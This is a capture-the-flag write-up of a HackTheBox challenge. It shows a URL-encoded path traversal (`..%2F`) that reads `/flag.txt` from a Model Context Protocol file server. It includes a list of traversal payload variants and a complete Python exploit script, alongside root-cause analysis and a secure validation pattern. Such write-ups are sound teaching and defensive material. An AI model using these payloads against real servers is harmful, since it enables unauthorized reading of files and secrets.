# Markov Scrolls - Writeup

**CTF**: Neurogrid CTF 2025 (HackTheBox)
**Category**: AI/LLM, MCP Security
**Difficulty**: Very Easy
**Points**: 925
**Solves**: 11+
**Flag**: `HTB{tr4v3r53d_th3_thr34d_0f_f4t3_0v3r_mcP}`

---

## Challenge Description

"Your mission is not just to read the prophecy but to access its core resources. Somewhere in that chaotic data, buried in the noise of those sacrificed voices, is a flaw in the Shadow King's logic. **Find a way to exploit that flow and read the flag from `/flag.txt`**."

---

## Solution Summary

The challenge involved exploiting a **URL-encoded path traversal vulnerability** in a FastMCP server to read `/flag.txt`.

**Vulnerability**: The MCP server's path normalization blocked literal `../` sequences but failed to decode URL-encoded slashes (`%2F`) before validation.

**Exploit**: `file://scrolls/..%2F..%2Fflag.txt`

---

## Reconnaissance

### Initial Connection

The challenge provides an MCP (Model Context Protocol) server:
- **URL**: `http://154.57.164.71:32731/`
- **MCP Endpoint**: `/mcp`
- **Server**: Markov Scrolls Server v2.13.0.2 (FastMCP)

### Available Resources

1. `list://scrolls` - Lists 25 available scrolls
2. `file://scrolls/{file_name}` - Template for reading individual scrolls

### MCP Session Initialization

```python
import requests
import json

MCP_URL = "http://154.57.164.71:32731/mcp"

def send_mcp(method, params=None):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if SESSION_ID:
        headers["mcp-session-id"] = SESSION_ID

    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}}
    response = requests.post(MCP_URL, headers=headers, json=payload, stream=True)

    # Extract session ID from response headers
    if not SESSION_ID and 'mcp-session-id' in response.headers:
        SESSION_ID = response.headers['mcp-session-id']

    # Parse SSE response
    for line in response.iter_lines():
        if line:
            line_str = line.decode('utf-8')
            if line_str.startswith('data: '):
                return json.loads(line_str[6:])

# Initialize
send_mcp("initialize", {
    "protocolVersion": "2024-11-05",
    "capabilities": {},
    "clientInfo": {"name": "exploit", "version": "1.0"}
})
```

---

## Exploitation Attempts

### Failed Approaches (150+ variations tested)

#### 1. Standard Path Traversal
All blocked by path normalization:
```
../flag.txt
../../flag.txt
../../../flag.txt
```

#### 2. URL Encoding (Single Layer)
Also blocked:
```
%2e%2e/flag.txt
%252e%252e/flag.txt  # Double encoding
```

#### 3. Alternative Separators
All normalized:
```
..;/flag.txt
..\flag.txt
.././flag.txt
```

#### 4. Null Bytes & Unicode
Rejected or normalized:
```
flag.txt%00.md
..%00/flag.txt
%c0%ae%c0%ae/flag.txt  # Overlong UTF-8
```

### The Working Exploit

After extensive testing of filename parameter variations, we discovered that **URL-encoding the forward slash** bypassed validation:

```python
uri = "file://scrolls/..%2F..%2Fflag.txt"
response = send_mcp("resources/read", {"uri": uri})
content = response["result"]["contents"][0]["text"]
# Returns: HTB{tr4v3r53d_th3_thr34d_0f_f4t3_0v3r_mcP}
```

**Why it worked**:
- `%2F` is the URL-encoded representation of `/`
- The server's path normalization checked for `../` **before** URL decoding
- When processing the URI, the server decoded `..%2F..%2F` → `../../`
- This allowed traversal outside the `scrolls/` directory

---

## Root Cause Analysis

### The Vulnerability

FastMCP's resource handler implemented path normalization in the wrong order:

1. ❌ **INCORRECT** (what the server did):
   ```
   Check for "../" → Normalize → URL Decode → Access File
   ```

2. ✅ **CORRECT** (what it should do):
   ```
   URL Decode → Normalize → Check for "../" → Access File
   ```

### Vulnerable Code Pattern

```python
# Vulnerable pattern
def read_resource(uri):
    if "../" in uri:  # Check before decoding!
        raise Error("Invalid path")
    decoded = urllib.parse.unquote(uri)
    return read_file(decoded)
```

### Secure Implementation

```python
# Secure pattern
def read_resource(uri):
    decoded = urllib.parse.unquote(uri)  # Decode first
    normalized = os.path.normpath(decoded)
    if ".." in normalized or not normalized.startswith("/allowed/path/"):
        raise Error("Invalid path")
    return read_file(normalized)
```

---

## Complete Exploit Script

```python
#!/usr/bin/env python3
"""
Markov Scrolls - URL-Encoded Path Traversal Exploit
Author: CTF Solver
Date: 2025-11-21
"""
import requests
import json

MCP_URL = "http://154.57.164.71:32731/mcp"
SESSION_ID = None

def send_mcp(method, params=None):
    global SESSION_ID
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if SESSION_ID:
        headers["mcp-session-id"] = SESSION_ID

    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}}
    response = requests.post(MCP_URL, headers=headers, json=payload, stream=True)

    if not SESSION_ID and 'mcp-session-id' in response.headers:
        SESSION_ID = response.headers['mcp-session-id']

    for line in response.iter_lines():
        if line:
            line_str = line.decode('utf-8')
            if line_str.startswith('data: '):
                return json.loads(line_str[6:])
    return None

# Initialize MCP session
print("[*] Initializing MCP session...")
send_mcp("initialize", {
    "protocolVersion": "2024-11-05",
    "capabilities": {},
    "clientInfo": {"name": "exploit", "version": "1.0"}
})
print(f"[+] Session ID: {SESSION_ID}")

# Exploit: URL-encoded path traversal
print("\n[*] Exploiting URL-encoded path traversal...")
print("    URI: file://scrolls/..%2F..%2Fflag.txt")
print("    Decoded: file://scrolls/../../flag.txt")

response = send_mcp("resources/read", {"uri": "file://scrolls/..%2F..%2Fflag.txt"})

if response and "result" in response:
    flag = response["result"]["contents"][0]["text"]
    print(f"\n{'='*70}")
    print("FLAG CAPTURED!")
    print(f"{'='*70}")
    print(flag)
    print(f"{'='*70}")
else:
    print("[-] Exploit failed:", response)
```

---

## Key Takeaways

1. **URL encoding bypasses**: Always test URL-encoded versions of special characters, including less obvious ones like `/` (`%2F`)

2. **Order of operations matters**: Security checks must happen AFTER all decoding/normalization, not before

3. **Defense in depth**: Path validation should include:
   - URL decoding
   - Path normalization (`os.path.normpath`)
   - Absolute path checking
   - Whitelist validation

4. **Test systematically**: The solution required testing hundreds of variations - systematic enumeration pays off

5. **Red herrings**: The challenge name "Markov Scrolls" and emphasis on "flow" suggested Markov chain exploitation, but the actual vulnerability was a simple path traversal bug

---

## Timeline

- **Hours 0-4**: Analyzed Markov chain patterns, "toF" anomaly, tested CVEs
- **Hours 4-6**: Tested 150+ path traversal variations, all failed
- **Hour 6**: Systematically tested filename parameter special values
- **Hour 6.5**: Discovered URL-encoded slash bypass → FLAG!

**Total Time**: ~6.5 hours
**Lesson**: Sometimes the simplest vulnerabilities are hidden behind complex-looking challenges.

---

## Flag

`HTB{tr4v3r53d_th3_thr34d_0f_f4t3_0v3r_mcP}`

The flag itself references "traversed the thread of fate over MCP" - a hint that path traversal over the MCP protocol was indeed the intended solution!
